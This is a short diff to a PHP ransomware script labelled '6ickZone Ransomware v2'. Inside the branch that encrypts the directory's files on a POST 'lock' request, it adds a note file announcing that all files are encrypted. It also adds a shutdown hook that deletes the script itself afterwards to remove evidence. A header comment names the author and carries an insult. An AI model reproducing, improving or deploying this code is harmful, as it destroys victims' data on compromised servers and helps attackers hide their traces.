@@ -1,5 +1,6 @@
 <?php
 // 6ickZone Ransomware v2 - Obfuscated Light
+//Copyright 6ickZone - 6ickWhispers@gmail.com//ganti cr ga bikin kau pro asu
 set_time_limit(0);
 error_reporting(0);
 
@@ -88,6 +89,14 @@ $run = false;
 if (isset($_POST['lock'])) {
     $run = true;
     x(__DIR__, $k, $x, $t, $e, $n);
+
+    //BYEBYE.txt
+    file_put_contents(__DIR__ . '/BYEBYE.txt', "All files have been encrypted.\n- 6ickZone was here.\nGoodbye.");
+
+    // die
+    register_shutdown_function(function() {
+        @unlink(__FILE__);
+    });
 }
 ?>
 
